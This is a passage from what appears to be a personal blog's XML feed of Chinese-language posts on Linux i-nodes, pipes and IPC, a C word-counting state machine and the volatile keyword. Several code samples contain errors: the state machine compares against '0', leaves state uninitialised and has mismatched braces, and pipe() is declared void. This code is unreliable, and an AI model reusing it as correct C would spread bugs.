    <content type="html"><![CDATA[<p>Linux下的文件系统知识总结</p><span id="more"></span><h1 id="Linux下的内存的抽象"><a href="#Linux下的内存的抽象" class="headerlink" title="Linux下的内存的抽象"></a>Linux下的内存的抽象</h1><ol><li>一个机械硬盘有许多个磁盘组成，每个磁盘又由多个同心圆组成，每个同心圆又被分为许多个扇区。</li></ol><h1 id="Linux下的内存管理基本知识"><a href="#Linux下的内存管理基本知识" class="headerlink" title="Linux下的内存管理基本知识"></a>Linux下的内存管理基本知识</h1><p>在Linux下，使用一种简单的方法，将存储空间划分为一下：<br><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202311180909539.png"></p><p><strong>超级块</strong>：用来存储文件系统本身的信息。比如，文件系统中各个区域的大小。没有被使用的区域的大小。<br><strong>i-node节点表</strong>：这个表的作用是将文件和文件存储的数据块联系起来。将文件的元数据存储与i-node结点表中。每一个i-node结点表意味着一个文件。<br>为什么需要使用i-node结点来表示一个文件，而不是直接使用块的编号来表示一个文件名。这是因为一个块的大小一般是固定的。（512byte），所以当又一个大文件的时候，其不止占用了一个内存块，这是就需要一个新的概念来表示一个文件。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">ls -i #可以查看i-node节点号和文件名的定义<br></code></pre></td></tr></table></figure><p><strong>数据区</strong>：将文件的数据存储在此。</p><h1 id="一个文件的创建过程"><a href="#一个文件的创建过程" class="headerlink" title="一个文件的创建过程"></a>一个文件的创建过程</h1><p>一个文件的创建的过程是：<br><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202311180925191.png"></p><ol><li>存储文件的属性，在Linux内核的帮助下文件系统会寻找一个空的i-node结点，用以存放该文件的元数据。诸如访问时间、文件大小、访问权限、归属者等等。但是注意<strong>文件名</strong>不是文件的元数据，所以其<strong>也不会存储在i-node结点中</strong>。</li><li>存储文件的内容，内核从空余的存储空间中找的满足文件大小的存储空间，便将其地址写入到i-node结点中。</li><li>添加文件名到目录中。</li></ol><h1 id="一个可执行文件的执行过程"><a href="#一个可执行文件的执行过程" class="headerlink" title="一个可执行文件的执行过程"></a>一个可执行文件的执行过程</h1><ol><li>通过用户输入的路径名称查找该文件的目录，通过目录找到了其对应的i-node号，但是并不会返回i-node号，而是添加一层抽象——文件描述符。文件描述符fd不仅仅包含了i-node节点号，还包括了文件当前的读写位置、文件打开的模式等等信息。</li><li>通过文件描述符中的i-node节点号，找到对应的i-node结点</li><li>分析该程序头，找到该程序的入口地址。</li><li>创建进程空间，建立物理地址和虚拟地址之间的映射关系。</li><li>装载程序，建立虚拟地址与程序存储空间之间的映射关系。</li><li>执行</li></ol><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p>《Unix-Linux编程实践教程》第4章</p><p><a href="https://en.wikipedia.org/wiki/X86-64">https://en.wikipedia.org/wiki/X86-64</a></p>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
      <category>文件系统</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>通信协议总结</title>
    <link href="/2023/11/12/%E9%80%9A%E4%BF%A1%E5%8D%8F%E8%AE%AE%E6%80%BB%E7%BB%93/"/>
    <url>/2023/11/12/%E9%80%9A%E4%BF%A1%E5%8D%8F%E8%AE%AE%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<p>通信协议总结</p><span id="more"></span><h1 id="I2C"><a href="#I2C" class="headerlink" title="I2C"></a>I2C</h1><h2 id="扩展资料"><a href="#扩展资料" class="headerlink" title="扩展资料"></a>扩展资料</h2><p><a href="https://www.infineon.com/dgdl/Infineon-Component_I2C_V3.30-Software%20Module%20Datasheets-v03_05-CN?fileId=8ac78c8c7d0d8da4017d0e95ad8e1ffd">官方手册</a></p><p><a href="http://www.wangdali.net/i2c/">个人blog总结</a></p><h1 id="SPI"><a href="#SPI" class="headerlink" title="SPI"></a>SPI</h1><h2 id="扩展资料-1"><a href="#扩展资料-1" class="headerlink" title="扩展资料"></a>扩展资料</h2><p><a href="http://www.wangdali.net/spi/">个人blog总结</a></p>]]></content>
    
    
    <categories>
      
      <category>stm32</category>
      
      <category>通信</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>C语言状态机</title>
    <link href="/2023/11/12/C%E8%AF%AD%E8%A8%80%E7%8A%B6%E6%80%81%E6%9C%BA/"/>
    <url>/2023/11/12/C%E8%AF%AD%E8%A8%80%E7%8A%B6%E6%80%81%E6%9C%BA/</url>
    
    <content type="html"><![CDATA[<p>状态机，使用C编程</p><span id="more"></span><h1 id="什么是状态机"><a href="#什么是状态机" class="headerlink" title="什么是状态机"></a>什么是状态机</h1><blockquote><p>有限状态机（英语：finite-state machine，缩写：FSM）又称有限状态自动机（英语：finite-state automaton，缩写：FSA），简称状态机，是表示有限个状态以及在这些状态之间的转移和动作等行为的数学计算模型。</p></blockquote><p>上面是<a href="https://zh.wikipedia.org/zh-hans/%E6%9C%89%E9%99%90%E7%8A%B6%E6%80%81%E6%9C%BA">wikipedia</a>上面的解释。</p><p>状态机的数学定义：</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202311121641791.png" alt="状态机的数学定义"><br><strong>接受状态又称之为最终状态</strong>，状态图中通常将其标示为双圆圈。</p><p>字母表：使得状态机状态变化的行为，<strong>就是状态图中的箭头</strong></p><hr><p>使用一个自动门来解释上面的数学定义：<br>一个自动门有两种状态——打开、关闭。这就是他的<strong>状态集（Q）</strong></p><p>当一个人进来、出去、在一定时间内没有没有人进出就会自动关上（超时）。这就是他的<strong>字母表</strong>。<strong>可以认为所谓的字母表就是可以改变状态的事件</strong></p><p>自动门从关闭到打开，就是他的<strong>状态转移函数</strong></p><p>门在刚刚安装好的时候，我们认为其初始状态时关闭的。这就是他的<strong>初始状态</strong>。</p><p>只要自动门没有坏，其就会一直运行，所以其没有<strong>接受状态</strong>，<strong>接受状态集</strong>为<strong>空集</strong><br><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202311121649020.png" alt="自动门的状态机"></p><h2 id="状态机的分类"><a href="#状态机的分类" class="headerlink" title="状态机的分类"></a>状态机的分类</h2><p>给定一个状态，和一个输入，你总能确定地转换到下一个状态。这就是<strong>确定有限状态机</strong>(DFA)</p><p>反之，如果无法正确的转换到下一个状态就是<strong>非确定有线状态机</strong>(NFA)</p><h1 id="状态机的工作原理"><a href="#状态机的工作原理" class="headerlink" title="状态机的工作原理"></a>状态机的工作原理</h1><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202311121630285.png" alt="状态机的工作原理"></p><h1 id="状态机的应用"><a href="#状态机的应用" class="headerlink" title="状态机的应用"></a>状态机的应用</h1><h2 id="使用状态机来计算文件中的单词的数量。"><a href="#使用状态机来计算文件中的单词的数量。" class="headerlink" title="使用状态机来计算文件中的单词的数量。"></a>使用状态机来计算文件中的单词的数量。</h2><p>状态集：</p><ol><li>指向字符（单词内）</li><li>指向非字符（单词外）</li></ol><p>字母表：<br>每个字符就是该模型下的字母表</p><p>状态转换函数：<br>从单词内转换到单词外函数</p><p>初始状态：</p><ol><li>指向的是一个字符</li><li>指向的不是一个字符</li></ol><p>接受状态：（接受状态又称之为结束状态）<br>指向文本的末尾</p><p>使用图形表达：</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202311121713414.png" alt="状态机"></p><h2 id="代码完成"><a href="#代码完成" class="headerlink" title="代码完成"></a>代码完成</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">count_word</span> <span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span>* txt)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">STAT</span>&#123;</span><br>        stat_init，<br>        stat_word_in,<span class="hljs-comment">//位于单词</span><br>        stat_word_out,<span class="hljs-comment">//不位于单词</span><br>    &#125;stat;<br><br>    <span class="hljs-type">int</span> count = <span class="hljs-number">0</span>;<span class="hljs-comment">//单词个数</span><br><br>    <span class="hljs-type">const</span> <span class="hljs-type">char</span>* p = txt;<br><br>    <span class="hljs-keyword">for</span>(p;*p != <span class="hljs-string">&#x27;0&#x27;</span>;p++)&#123;<br>        <span class="hljs-keyword">switch</span>(stat)&#123;<br>        <span class="hljs-keyword">case</span> stat_init:<br>            <span class="hljs-keyword">if</span>(IS_WORD_CHAR())&#123;<span class="hljs-comment">//如果文本的开头是一个字符的话</span><br>                stat = stat_word_in;<br>            &#125;<br>            <span class="hljs-keyword">else</span>&#123;<br>                stat = stat_word_out;<br>            &#125;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> stat_word_in:<br>            <span class="hljs-keyword">if</span>(!IS_WORD_CHAR())&#123;<span class="hljs-comment">//如果不是一个字符了，那么count++</span><br>                stat = stat_word_out;<br>                count++;<br>            &#125;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> stat_word_out:<br>            <span class="hljs-keyword">if</span>(IS_WORD_CHAR())&#123;<span class="hljs-comment">//如果是一个字符，改变状态</span><br>                stat = stat_word_in;<br>            &#125;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">default</span>:<br>            <span class="hljs-keyword">break</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span>(stat == stat_word_in)&#123;<br>        count++;<br>    &#125;<br>    <span class="hljs-keyword">return</span> count;<br>&#125;<br><br></code></pre></td></tr></table></figure><h1 id="扩展阅读"><a href="#扩展阅读" class="headerlink" title="扩展阅读"></a>扩展阅读</h1><p><a href="https://juejin.cn/post/6844903827540279309">https://juejin.cn/post/6844903827540279309</a></p><p><a href="https://cloud.tencent.com/developer/article/1046244">https://cloud.tencent.com/developer/article/1046244</a></p><p><a href="https://zhuanlan.zhihu.com/p/572636669">https://zhuanlan.zhihu.com/p/572636669</a></p><p><a href="https://zhuanlan.zhihu.com/p/28142401">这个可以</a></p><p><a href="https://www.bilibili.com/video/BV1oN411Y7FK/?spm_id_from=333.337.search-card.all.click&vd_source=c45053ab3367ce0770ffe8e9b3dced95">https://www.bilibili.com/video/BV1oN411Y7FK/?spm_id_from=333.337.search-card.all.click&amp;vd_source=c45053ab3367ce0770ffe8e9b3dced95</a></p><p><a href="https://gpp.tkchu.me/state.html">一个游戏开发者网站，但是讲到了状态机</a></p><p><a href="https://regexper.com/">一个关于正则表达式与状态机网站</a></p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p>《系统程序员成长计划》第10章</p>]]></content>
    
    
    <categories>
      
      <category>C</category>
      
      <category>杂项</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>好站推荐</title>
    <link href="/2023/11/11/%E5%A5%BD%E7%AB%99%E6%8E%A8%E8%8D%90/"/>
    <url>/2023/11/11/%E5%A5%BD%E7%AB%99%E6%8E%A8%E8%8D%90/</url>
    
    <content type="html"><![CDATA[<h2 id="一些知识网站"><a href="#一些知识网站" class="headerlink" title="一些知识网站"></a>一些知识网站<br><span id="more"></span></h2><h1 id="专业知识"><a href="#专业知识" class="headerlink" title="专业知识"></a>专业知识</h1><p><a href="https://lonlypan.com/2022/05/08/%E5%B5%8C%E5%85%A5%E5%BC%8F%E9%9D%A2%E8%AF%95-%E7%9F%A5%E8%AF%86%E7%82%B9%E5%A4%8D%E4%B9%A0/#%E7%BC%96%E7%A8%8B-%E8%AF%AD%E8%A8%80">嵌入式知识点复习(1)</a></p><p><a href="https://lonlypan.com/2022/05/08/%E5%B5%8C%E5%85%A5%E5%BC%8F%E9%9D%A2%E8%AF%95-C%E8%AF%AD%E8%A8%80%E5%86%8D%E5%AD%A6%E4%B9%A0/#%E4%B8%80%E3%80%81GCC%E7%AE%80%E4%BB%8B%EF%BC%9A">嵌入式知识点复习(2)</a></p><p><a href="https://lonlypan.com/2021/01/24/%E7%A1%AC%E4%BB%B6%E8%AE%BE%E8%AE%A1%E5%BA%94%E7%94%A8%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/#%E5%AD%A6%E4%B9%A0%E8%AE%BA%E5%9D%9B">嵌入式知识点复习(3)</a></p>]]></content>
    
    
    <categories>
      
      <category>杂项</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Linux下的进程通信方式之管道</title>
    <link href="/2023/11/10/Linux%E4%B8%8B%E7%9A%84%E8%BF%9B%E7%A8%8B%E9%80%9A%E4%BF%A1%E6%96%B9%E5%BC%8F%E4%B9%8B%E7%AE%A1%E9%81%93/"/>
    <url>/2023/11/10/Linux%E4%B8%8B%E7%9A%84%E8%BF%9B%E7%A8%8B%E9%80%9A%E4%BF%A1%E6%96%B9%E5%BC%8F%E4%B9%8B%E7%AE%A1%E9%81%93/</url>
    
    <content type="html"><![CDATA[<p>详解管道通信</p><span id="more"></span><h1 id="概述及特点"><a href="#概述及特点" class="headerlink" title="概述及特点"></a>概述及特点</h1><p>当我们需要把一个进程的输出作为另一个进程的输入时，应该如何通讯？管道解决了这个问题。</p><p>管道是UNIX上历史最悠久的IPC方式，它在 20 世纪 70 年代早期 UNIX 的第三个版本上就出现了。在shell中我们是如何使用管道的？</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ls</span> | <span class="hljs-built_in">wc</span> -l<br></code></pre></td></tr></table></figure><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202311101250265.png" alt="管道的工作原理"></p><h2 id="一个管道就是一个字节流"><a href="#一个管道就是一个字节流" class="headerlink" title="一个管道就是一个字节流"></a>一个管道就是一个字节流</h2><p>一个管道就是一个字节流。所以从管道读取数据时，可以是任何的数据大小，而不用管写入时是以多少个字节写入的。并且管道的数据传输是具有顺序的，<strong>从管道中读取出来的字节的顺序与它们被写入管道的顺序是完全一样的。在管道中无法使用 lseek()来随机地访问数据。</strong></p><h2 id="从管道中读取数据时"><a href="#从管道中读取数据时" class="headerlink" title="从管道中读取数据时"></a>从管道中读取数据时</h2><p>如果试图从一个没有数据的管道中读取数据，那么将会被阻塞知道有数据被写入管道中。</p><h2 id="管道是单向的"><a href="#管道是单向的" class="headerlink" title="管道是单向的"></a>管道是单向的</h2><p><strong>管道时半双工通信方式，一次只可以进行读或是写。</strong>并且管道的一端用于写，一端用于读。</p><h2 id="管道数据传输的原子保证"><a href="#管道数据传输的原子保证" class="headerlink" title="管道数据传输的原子保证"></a>管道数据传输的原子保证</h2><p>在单个进程写入数据的时候无需担心管道数据的同步问题，但是在多个进程向一个管道中写入数据时，Linux保证了<strong>写入不超过 PIPE_BUF 字节的操作是原子的</strong>。注意，不同的UNIX实现<code>PIPE_BUF</code>大小是不同的。</p><div class="note note-warning">            <p>只有在数据被传输到管道的时候 <code>PIPE_BUF</code> 限制才会起作用。</p>          </div><p>如果只有一个进程进行数据写入的话，<code>PIPE_BUF</code>的取值就没有关系了，但是如果是有多个进程的写的话，写入的数据大于<code>PIPE_BUF</code>，内核可能会把该数据块划分为几个小的数据块。分为几次传输。</p><p><strong>当写入的数据已经</strong>达到PIPE_BUF 字节时，write()会在必要的时候阻塞直到管道中的可用空间足以原子地完成操作。</p><div class="note note-warning">            <p>如果此类阻塞的 write()被一个信号处理器中断了，那么这个调用会被解除阻塞并返回成功传输到管道中的字节数，这个字节数会少于请求写入的字节数（所谓的部分写入）。</p>          </div><h3 id="小总结"><a href="#小总结" class="headerlink" title="小总结"></a>小总结</h3><p>单个进程通信时，<code>PIPE_BUF</code>取值没有关系，多个时又分为：传输完成前，已经传输完成后。</p><p>如果传输完成前传输的数据大小大于<code>PIPE_BUF</code>，那么内核将分隔这个数据块，分为多次传输，<strong>以保证操作的原子性</strong></p><p>如果管道中的数据已经大于<code>PIPE_BUF</code>，此时内核会阻塞<code>write</code>，直到有<code>read</code>消耗管道中的数据。</p><h2 id="管道的大小是有限的"><a href="#管道的大小是有限的" class="headerlink" title="管道的大小是有限的"></a>管道的大小是有限的</h2><p>管道其实是一个在内核内存中维护的缓冲器，这个缓冲器的存储能力是有限的。一旦管道被填满之后，后续向该管道的写入操作就会被阻塞直到读者从管道中移除了一些数据为止。</p><blockquote><p>在早于 2.6.11 的 Linux 内核中，管道的存储能力与系统页面的大小是一致的（如在 x86-32 上是 4096 字节），而从 Linux 2.6.11 起，管道的存储能力是65,536 字节。</p></blockquote><h1 id="管道的创建及使用"><a href="#管道的创建及使用" class="headerlink" title="管道的创建及使用"></a>管道的创建及使用</h1><p>在bash中，使用<code>|</code>来创建一个管道，在系统编程中，提供了函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-type">void</span> <span class="hljs-title function_">pipe</span><span class="hljs-params">(<span class="hljs-type">int</span> filedes[<span class="hljs-number">2</span>])</span><br><br><span class="hljs-comment">//成功返回0，失败返回-1</span><br><span class="hljs-comment">//成功的 pipe()调用会在数组 filedes 中返回两个打开的文件描述符：一个表示管道的读取端filedes[0]），另一个表示管道的写入端（filedes[1]）。</span><br></code></pre></td></tr></table></figure><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202311101431604.png" alt="管道的创建"></p><p>一般来说都是上图的右边部分，在fork()调用之后，其中一个进程应该立即关闭管道的写入端的描述符，另一个则应该关闭读取端的描述符。</p><h3 id="关于管道读写进程的文件描述符关闭："><a href="#关于管道读写进程的文件描述符关闭：" class="headerlink" title="关于管道读写进程的文件描述符关闭："></a>关于管道读写进程的文件描述符关闭：</h3><p>写进程的读文件描述符需要关闭<br>读进程的写文件描述符需要关闭</p><p>原因：</p><ol><li><p>写进程的读文件描述符要关闭是因为，如果一个写进程去往一个没有读文件描述符被打开的管道中写数据，内核会发送一个信号<code>SIGPIPE</code>。在默认情况下，这个信号会杀死一个进程。但是进程可以捕捉或者忽略它，这样会导致管道上的写操作会因为<code>EPIPE</code>错误而失败。而这个错误对于进管道的状态是有用的。所以需要关闭写进程的读文件描述符，防止无法发送<code>SIDPIPE</code>信号。</p></li><li><p>读进程的写文件描述符需要被关闭是因为，如果所有的写文件描述符都被关闭了，读进程就会读到<code>EOF</code>表示文件的截止。如果读进程的写文件描述符没有被关闭的话，会导致无法读到<code>EOF</code>。所以读进程就会阻塞<code>read</code>，导致读被阻塞。</p></li><li><p>除开上面的这两种原因，及时关闭文件描述符，可以防止管道通信消耗文件描述符。</p></li><li><p>只有在管道的所有文件操作符都被关闭以后，内核才会回收该管道的资源。</p></li></ol><h1 id="管道的应用"><a href="#管道的应用" class="headerlink" title="管道的应用"></a>管道的应用</h1><h2 id="使用管道来同步进程"><a href="#使用管道来同步进程" class="headerlink" title="使用管道来同步进程"></a>使用管道来同步进程</h2><h2 id="使用管道来执行shell命令"><a href="#使用管道来执行shell命令" class="headerlink" title="使用管道来执行shell命令"></a>使用管道来执行<code>shell</code>命令</h2><h2 id=""><a href="#" class="headerlink" title=""></a></h2><h1 id="扩展阅读"><a href="#扩展阅读" class="headerlink" title="扩展阅读"></a>扩展阅读</h1><p><a href="https://www.cnblogs.com/zhuangquan/p/13141456.html">https://www.cnblogs.com/zhuangquan/p/13141456.html</a></p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p>《LINUX-UNIX系统编程》</p>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
      <category>进程</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Linux下的进程通信方式</title>
    <link href="/2023/11/10/Linux%E4%B8%8B%E7%9A%84%E8%BF%9B%E7%A8%8B%E9%80%9A%E4%BF%A1%E6%96%B9%E5%BC%8F/"/>
    <url>/2023/11/10/Linux%E4%B8%8B%E7%9A%84%E8%BF%9B%E7%A8%8B%E9%80%9A%E4%BF%A1%E6%96%B9%E5%BC%8F/</url>
    
    <content type="html"><![CDATA[<p>Linux下的六种进程间通信方式简述</p><span id="more"></span><h1 id="Linux下的六种进程间通信方式"><a href="#Linux下的六种进程间通信方式" class="headerlink" title="Linux下的六种进程间通信方式"></a>Linux下的六种进程间通信方式</h1><ol><li>信号</li><li>信号量</li><li>管道</li><li>消息队列</li><li>套接字</li><li>共享内存</li></ol><h2 id="信号"><a href="#信号" class="headerlink" title="信号"></a>信号</h2><p>Linux系统定义了大量信号，比如说：<code>SIGINIT</code> <code>SIGKILL</code> <code>SIGHUP</code>等等</p><p>信号用以进行进程之间的通讯，通知接收进程某个事件已经发生。</p><h2 id="管道"><a href="#管道" class="headerlink" title="管道"></a>管道</h2><p>管道(pipe)还包含有名管道(FIFO)、流管道(s_pipe)。</p><h3 id="pipe"><a href="#pipe" class="headerlink" title="pipe"></a>pipe</h3><p>这是最基础的无名管道，其特点是只可以用于有亲缘关系之间的进程进行通信，并且还是只可以进行半双工（一次性只可以接受或者是发送数据）</p><blockquote><p><strong>无名管道简单方便．但局限于单向通信的工作方式．并且只能在创建它的进程及其子孙进程之间实现管道的共享</strong></p></blockquote><h3 id="s-pipe"><a href="#s-pipe" class="headerlink" title="s_pipe"></a>s_pipe</h3><p>流管道使得管道可以进行全双工通信</p><h3 id="FIFO"><a href="#FIFO" class="headerlink" title="FIFO"></a>FIFO</h3><p>有名管道使得管道可以进行无亲缘关系的进程之间的通信。</p><blockquote><p><strong>有名管道虽然可以提供给任意关系的进程使用．但是由于其长期存在于系统之中，使用不当容易出错．所以普通用户一般不建议使用。</strong></p></blockquote><h2 id="信号量-semophore"><a href="#信号量-semophore" class="headerlink" title="信号量(semophore)"></a>信号量(semophore)</h2><p>信号量其实是一种同步机制，其是一个计数器。有二元信号量，三元，N元等等。</p><h2 id="套接字-socket"><a href="#套接字-socket" class="headerlink" title="套接字(socket)"></a>套接字(socket)</h2><p>套解口也是一种进程间通信机制，与其他通信机制不同的是，它可用于不同机器间的进程通信</p><h2 id="消息队列"><a href="#消息队列" class="headerlink" title="消息队列"></a>消息队列</h2><p>消息队列是有消息组成的，其是消息的队列。其克服了消息传递的消息少，管道只可以承受无格式字节流和受限于缓冲区大小的限制。</p><blockquote><p><strong>消息缓冲可以不再局限于父子进程，而允许任意进程通过共享消息队列来实现进程间通信，并由系统调用函数来实现消息发送和接收之间的同步，从而使得用户在使用消息缓冲进行通信时不再需要考虑同步问题，使用方便，但是信息的复制需要额外消耗CPU的时间，不适宜于信息量大或操作频繁的场合。</strong></p></blockquote><h2 id="共享内存"><a href="#共享内存" class="headerlink" title="共享内存"></a>共享内存</h2><p>共享内存就是内核映射一段能被其他进程所访问的内存。这段共享内存由一个进程创建，但多个进程都可以访问。</p><p><strong>共享内存是最快的 IPC 方式</strong>，它是针对其他进程间通信方式运行效率低而专门设计的。它往往与其他通信机制，如信号量，配合使用，来实现进程间的同步和通信。</p><p>共享内存的通信方式是通过将共享的内存缓冲区直接附加到进程的虚拟地址空间中来实现的，因此，这些进程之间的读写操作的同步问题操作系统无法实现。必须由各进程利用其他同步工具解决。另外，由于内存实体存在于计算机系统中，所以只能由处于同一个计算机系统中的诸进程共享。不方便网络通信。</p><p>共享内存块提供了在<strong>任意数量的进程</strong>之间进行高效双向通信的机制。每个使用者都可以读取写入数据，但是所有程序之间必须达成并遵守一定的协议，以防止诸如在读取信息之前覆写内存空间等竞争状态的出现。</p><p>不幸的是，Linux无法严格保证提供对共享内存块的独占访问，甚至是在您通过使用IPC_PRIVATE创建新的共享内存块的时候也不能保证访问的独占性。 同时，多个使用共享内存块的进程之间必须协调使用同一个键值。</p><blockquote><p><strong>共享内存针对消息缓冲的缺点改而利用内存缓冲区直接交换信息，无须复制，快捷、信息量大是其优点。</strong>，所以大数据量，可以使用共享内存。</p></blockquote><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><ul><li><p>管道：速度慢，容量有限，只有父子进程能通讯</p></li><li><p>FIFO：任何进程间都能通讯，但速度慢</p></li><li><p>消息队列：容量受到系统限制，且要注意第一次读的时候，要考虑上一次没有读完数据的问题</p></li><li><p>信号量：不能传递复杂消息，只能用来同步</p></li><li><p>共享内存区：能够很容易控制容量，速度快，但要保持同步，比如一个进程在写的时候，另一个进程要注意读写的问题，相当于线程中的线程安全，当然，共享内存区同样可以用作线程间通讯，不过没这个必要，线程间本来就已经共享了同一进程内的一块内存</p></li></ul><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a href="https://www.cnblogs.com/wuyepeng/p/9747515.html">https://www.cnblogs.com/wuyepeng/p/9747515.html</a></p><p>Linux-Unix系统编程</p>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
      <category>杂项</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>volatile关键字</title>
    <link href="/2023/11/09/volatile%E5%85%B3%E9%94%AE%E5%AD%97/"/>
    <url>/2023/11/09/volatile%E5%85%B3%E9%94%AE%E5%AD%97/</url>
    
    <content type="html"><![CDATA[<p>volatile关键字总结</p><span id="more"></span><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><h2 id="volatile介绍"><a href="#volatile介绍" class="headerlink" title="volatile介绍"></a><code>volatile</code>介绍</h2><p><code>volatile</code>关键字告诉编译器，不要去寄存器中访问某个变量，而是直接去内存中读取。</p><h2 id="volatile关键字的使用场景"><a href="#volatile关键字的使用场景" class="headerlink" title="volatile关键字的使用场景"></a><code>volatile</code>关键字的使用场景</h2><p><code>volatile</code>常用的场景：</p><ol><li>并行设备的寄存器，如状态寄存器</li><li>多线程程序</li><li>一个中断服务子程序访问到的非自动变量</li></ol><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p><strong>为什么在中断中修改了i的值，而在main函数中的i没有被编译器认为是1。而如果不是通过中断修改i，而只是在程序中修改i的值，main函数中的i就会被认为是1。</strong></p><p>这就类似于：就比如我在盯着一个房间有没有人，我一开始进这个房间看了一眼，没有人，那么这个时候我就只需要在门口盯着，确保没有人从门口进去就行了。这个时候中断来了，就类似时间被暂停了，然后有个人进房间了。然后时间恢复，这个时候我依旧只会盯着门看，不会进门去看一下，确认房间是否有人。因为我认为我一直在盯着门。　</p><p>这个就类似一开始编译器从内存中拿出i的值放到寄存器中，然后if(i)反复判断。编译器就会认为我中间没有去做其他事，没有必要再去从内存中拿一次i的值。</p><p>而如果再程序中修改i的值，就类似我在看着门，突然有事离开。然后再回来，我要确保我出去的这段时间，有没有人进房间，所以会进房间看一次有没有人。就类似从内存中取一次i的值。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    ...<br>     <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)<br>    &#123;<br>         <span class="hljs-keyword">if</span> (i)<br>         &#123;<br>              dosomething();<br>         &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">/* Interrupt service routine. */</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">ISR_2</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>      i=<span 